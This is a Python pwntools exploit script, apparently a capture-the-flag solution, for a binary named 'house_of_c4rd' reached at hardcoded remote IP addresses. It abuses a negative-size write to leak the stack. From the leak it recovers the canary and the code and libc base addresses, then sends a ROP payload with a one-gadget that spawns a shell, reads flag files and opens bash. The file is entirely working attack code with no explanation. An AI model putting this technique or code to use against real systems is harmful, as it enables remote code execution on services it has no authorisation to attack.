#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

code = ELF('./house_of_c4rd')
context.binary = code
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
libc = code.libc


def prewrite(r, filename):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', filename)


def preread(r, filename):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', filename)


def dowrite(r, size, data, key):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Size data> ', str(size))
    r.sendlineafter('Data> ', data)
    r.sendlineafter('Key> ', key)


def doread(r, key):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Enter key> ', key)


SERVER_IP = '202.120.7.193'
R_IP = '180.160.160.244'
R2_IP = '106.14.178.74'

r = remote(SERVER_IP, 11111)
prewrite(r, 'qwe')
dowrite(r, -1, '', 'qwe')

r2 = remote(R2_IP, 11111)
prewrite(r2, 'qwe')
written_cnt = int(r.recvuntil('written', drop=True))
if written_cnt < 0x400:
    error('dump stack failed')
dowrite(r2, -1, cyclic(8) + '{}\0'.format(R_IP).ljust(0x10) * 0x1ff, 'qwe')
preread(r2, 'qwe')
doread(r2, 'qwe')
r2.recvline_startswith('Your ')
leak = r2.recvuntil('267cc682c5c1d077df8f7f6e194c9d12')
if leak.startswith(cyclic(8)):
    error('modify REMOTE_IP failed')

print hexdump(leak)
stack = leak[0x400:]
code.address = u64(stack[0x10:0x18]) - 0x1e70
libc.address = u64(stack[0x18:0x20]) - 0x20830
canary = u64(stack[0x8:0x10])
info("code address: %#x", code.address)
info("libc address: %#x", libc.address)
info("canary: %#x", canary)

prewrite(r, 'qwe')
rop = flat('A' * 0x400, 0xdeadbeef, canary, 0xdeadbeef, libc.address + 0xf1147,
           "\x00" * 0x100)
dowrite(r, -1, rop, 'qwe')

r.sendline('1')
r.sendline('cat /home/*/flag*')
r.sendline('bash')

r.interactive()
